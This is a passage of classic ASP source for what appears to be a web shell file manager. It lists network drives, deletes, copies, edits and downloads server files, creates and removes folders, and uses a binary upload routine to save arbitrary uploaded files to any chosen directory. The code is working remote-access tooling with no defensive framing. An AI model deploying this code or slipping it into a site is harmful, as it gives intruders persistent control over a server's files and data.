<TD>
<CENTER>
<TABLE BGCOLOR=#505050 CELLPADDING=4>
<TR>
<TD BGCOLOR=BLACK ><A HREF="<%=request.Servervariables("SCRIPT_NAME")%>?getDRVs=@&txtpath=<%=MyPath%>"><FONT SIZE=-2 FACE=ARIAL>Retrieve Available Network Drives</A></TD>
</TR>
<TR>
<TR>
<TD BGCOLOR=BLACK  ALIGN=RIGHT><A HREF="<%=request.Servervariables("SCRIPT_NAME")%>?logoff=@"><FONT SIZE=-2 FACE=ARIAL>[ LOGOFF ]</A></TD>
</TR>
</TABLE>
</TD>
</TR>
</TABLE>

<TABLE WIDTH=75% BGCOLOR=#505050 CELLPADDING=4 >\
  <TR>
    <TD>
      <FORM METHOD="post" ACTION="<%=request.Servervariables("SCRIPT_NAME")%>" >
        <FONT FACE=ARIAL SIZE=-1 >Delete file from current directory:</FONT><BR>
        <SELECT SIZE=1 NAME=TODELETE >
          <OPTION>Select from list</OPTION>"

          <%
          fi=0
          For each file in folder.Files
          	response.write "<OPTION>" & file.name & "</OPTION>" & vbCrLf
          fi = fi+1
          next
          
          response.write "</SELECT>" & vbCrLf
          
          response.write "<input type=hidden name=txtpath value=""" & MyPath & """>"
          response.write "<input type=Submit name=cmd value=Delete >"
          response.write "</FORM>" & vbCrLf
          response.write "</TD>" & vbCrLf
          
          response.write "<TD>" & vbCrLf
          
          response.write "<FORM method=post name=frmCopyFile action=""" & request.Servervariables("SCRIPT_NAME") & """ >"
          response.write "<font face=arial size=-1 >Copy file to current directory:</font><br><select size=1 name=ToCopy >"
          response.write "<OPTION>Select from list</OPTION>"  & vbCrLf
          
          For each file in fileCopy.Files
          	response.write "<OPTION>" & file.name & "</OPTION>" & vbCrLf
          next
          response.write "</SELECT>" & vbCrLf
          
          response.write "<input type=hidden name=txtpath value=""" & MyPath & """>"
          response.write "<input type=Submit name=cmd value=""  Copy "" >"
          
          response.write "</FORM>" & vbCrLf
          response.write "</TD>" & vbCrLf
          response.write "</TR>" & vbCrLf
          response.write "</TABLE>" & vbCrLf
          
          response.Flush
          
          ' ---View Tree Begins Here
          response.write "<table Cellpading=2 width=75% bgcolor=#505050 >"
          response.write "<TR>"
          response.write "<TD valign=top width=50% bgcolor=#303030 >"
          response.write "Folders:<P>"
          
          fo = 0
          response.write "<font face=wingdings color=Gray >0</font> <FONT COLOR=#c8c8c8><span style='cursor: hand;' OnClick=""getit('..')"">..</span></FONT><BR>"
          
          For each fold in folder.SubFolders '-->FOLDERz
          fo = fo+1
          	response.write "<font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick=""getit('" & fold.name & "')"">" & fold.name & "</span></FONT><BR>"
          Next
          %>
          
<BR><CENTER><FORM METHOD=POST ACTION="<%=request.Servervariables("SCRIPT_NAME")%>?txtpath=<%=MyPath%>">
<TABLE BGCOLOR=#505050 CELLSPACING=4><TR><TD>
<FONT FACE=ARIAL SIZE=-1 TITLE="Create and Delete folders by entering their names here manually.">Directory:</TD></TR>
<TR><TD ALIGN=RIGHT ><INPUT TYPE=TEXT SIZE=20 NAME=DIRNAME><BR>
<INPUT TYPE=SUBMIT NAME=CMD VALUE=CREATE><INPUT TYPE=SUBMIT NAME=CMD VALUE=DELETE><INPUT TYPE=HIDDEN NAME=DIRSTUFF VALUE=@>
</TR></TD></TABLE></FORM>
<%
response.write "<BR></TD><td valign=top width=50% bgcolor=#303030 >Files:<BR><BR>"
response.Flush
%>
	<FORM METHOD=POST NAME=FRMCOPYSELECTED ACTION="<%=request.Servervariables("SCRIPT_NAME")%>?txtpath=<%=MyPath%>">
<%
	response.write "<center><select name=Fname size=" & fi+3 & " style=""background-color: rgb(48,48,48); color: rgb(210,210,210)"">"
For each file in folder.Files '-->FILEz
	response.write "<option value=""" & file.name & """>&nbsp;&nbsp;" & file.name & " -- [" & Int(file.size/1024)+1 & " kb]</option>"
Next
	response.write "</select>"
	response.write "<br><input type=submit name=cmd value=""   Copy   ""><input type=submit name=cmd value=""Edit/Create""><input type=submit name=cmd value=Download>"
%>
	</FORM>
<%
	response.write "<BR></TD></TR><TR><td align=center ><B>Listed: " & fo & "</b></TD><td align=center ><b>Listed: " & fi & "</b></TD></TR></table><BR>"
' ---View Tree Ends Here
' ---Upload Routine starts here
%>
	<FORM METHOD="post" ENCTYPE="multipart/form-data" ACTION="<%=request.Servervariables("SCRIPT_NAME")%>?upload=@&txtpath=<%=MyPath%>">
<TABLE BGCOLOR="#505050" CELLPADDING="8">
  <TR>
    <TD BGCOLOR=#303030 VALIGN="bottom"><FONT SIZE=+1 FACE=WINGDINGS COLOR=GRAY >2</FONT><FONT FACE="Arial" SIZE=-2 COLOR="#ff8300"> SELECT FILES TO UPLOAD:<BR>
    <INPUT TYPE="FILE" SIZE="53" NAME="FILE1"><BR><INPUT TYPE="FILE" SIZE="53" NAME="FILE2"><BR>
	<INPUT TYPE="FILE" SIZE="53" NAME="FILE3">&nbsp;&nbsp;<INPUT TYPE="submit" VALUE="Upload" NAME="Upload" TITLE="If you recieve an error while uploading, then most likely you do not have write access permission to directory.">
	</FONT></TD>
  </TR>
</TABLE>

</FORM>
<%
' ---Upload Routine stops here
%>
</BODY></HTML>
<%
Function BufferContent(data)
	Dim strContent(64)
	Dim i
	ClearString strContent
	For i = 1 To LenB(data)
		AddString strContent,Chr(AscB(MidB(data,i,1)))
	Next
	BufferContent = fnReadString(strContent)
End Function

Sub ClearString(part)
	Dim index
	For index = 0 to 64
		part(index)=""
	Next
End Sub

Sub AddString(part,newString)
	Dim tmp
	Dim index
	part(0) = part(0) & newString
	If Len(part(0)) > 64 Then
		index=0
		tmp=""
		Do
			tmp=part(index) & tmp
			part(index) = ""
			index = index + 1
		Loop until part(index) = ""
		part(index) = tmp
	end if
End Sub

Function fnReadString(part)
	Dim tmp
	Dim index
	tmp = ""
	For index = 0 to 64
		If part(index) <> "" Then
			tmp = part(index) & tmp
		end if
	Next
	FnReadString = tmp
End Function


Class FileUploader
	Public  Files
	Private mcolFormElem
	Private sub Class_Initialize()
		Set Files = Server.CreateObject("Scripting.Dictionary")
		Set mcolFormElem = Server.CreateObject("Scripting.Dictionary")
	End Sub

	Private sub Class_Terminate()
		If IsObject(Files) Then
			Files.RemoveAll()
			Set Files = Nothing
		end if
		If IsObject(mcolFormElem) Then
			mcolFormElem.RemoveAll()
			Set mcolFormElem = Nothing
		end if
	End Sub

	Public Property Get Form(sIndex)
		Form = ""
		If mcolFormElem.Exists(LCase(sIndex)) then Form = mcolFormElem.Item(LCase(sIndex))
	End Property

	Public Default sub Upload()
		Dim biData, sInputName
		Dim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos
		Dim nPosFile, nPosBound
		biData = request.BinaryRead(request.TotalBytes)
		nPosBegin = 1
		nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
		If (nPosEnd-nPosBegin) <= 0 then Exit Sub
		vDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
		nDataBoundPos = InstrB(1, biData, vDataBounds)
		Do Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString("--"))
			nPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))
			nPos = InstrB(nPos, biData, CByteString("name="))
			nPosBegin = nPos + 6
			nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))
			sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			nPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))
			nPosBound = InstrB(nPosEnd, biData, vDataBounds)
			If nPosFile <> 0 And  nPosFile < nPosBound Then
				Dim oUploadFile, sFileName
				Set oUploadFile = New UploadedFile
				nPosBegin = nPosFile + 10
				nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))
				sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, "\"))
				nPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))
				nPosBegin = nPos + 14
				nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
				oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				nPosBegin = nPosEnd+4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
				If oUploadFile.FileSize > 0 then Files.Add LCase(sInputName), oUploadFile
			Else
				nPos = InstrB(nPos, biData, CByteString(Chr(13)))
				nPosBegin = nPos + 4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				If Not mcolFormElem.Exists(LCase(sInputName)) then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			end if
			nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)
		Loop
	End Sub

	'String to byte string conversion
	Private Function CByteString(sString)
		Dim nIndex
		For nIndex = 1 to Len(sString)
		   CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))
		Next
	End Function

	'Byte string to string conversion
	Private Function CWideString(bsString)
		Dim nIndex
		CWideString =""
		For nIndex = 1 to LenB(bsString)
		   CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1))) 
		Next
	End Function
End Class


Class UploadedFile
	Public ContentType
	Public FileName
	Public FileData
	Public Property Get FileSize()
		FileSize = LenB(FileData)
	End Property

	Public sub SaveToDisk(sPath)
		Dim oFS, oFile
		Dim nIndex
		If sPath = "" Or FileName = "" then Exit Sub
		If Mid(sPath, Len(sPath)) <> "\" then sPath = sPath & "\"
		Set oFS = Server.CreateObject("Scripting.FileSystemObject")
		If Not oFS.FolderExists(sPath) then Exit Sub
		Set oFile = oFS.CreateTextFile(sPath & FileName, True)
		' output mechanism modified for buffering
		oFile.Write BufferContent(FileData)
		oFile.Close
	End Sub

	Public sub SaveToDatabase(ByRef oField)
		If LenB(FileData) = 0 then Exit Sub
		If IsObject(oField) Then
			oField.AppendChunk FileData
		end if
	End Sub
End Class
%>